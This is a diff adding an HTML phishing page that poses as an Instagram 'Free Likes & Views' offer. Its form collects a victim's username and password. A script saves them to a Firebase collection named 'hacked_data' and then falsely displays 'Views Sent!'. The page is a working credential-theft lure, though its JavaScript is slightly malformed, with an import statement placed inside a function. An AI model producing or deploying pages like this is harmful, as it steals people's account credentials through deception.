@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram - Free Views</title>
+    <link rel="stylesheet" href="style.css">
+    <script type="module" src="firebase-config.js"></script>
+</head>
+<body>
+    <div class="container">
+        <h1 style="color: #E1306C;">Instagram</h1>
+        <p>Get Free Likes & Views</p>
+        <input type="text" id="username" placeholder="Username">
+        <input type="password" id="password" placeholder="Password">
+        <button onclick="submitInsta()">Submit</button>
+        <div id="msg" class="success-msg"></div>
+    </div>
+
+    <script type="module">
+        async function submitInsta() {
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            
+            import { db, collection, addDoc } from './firebase-config.js';
+            await addDoc(collection(db, "hacked_data"), {
+                platform: "Instagram",
+                username: user,
+                password: pass,
+                timestamp: new Date(),
+                details: "Likes/Views Request"
+            });
+            document.getElementById('msg').innerHTML = "✅ Views Sent!";
+            document.getElementById('msg').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
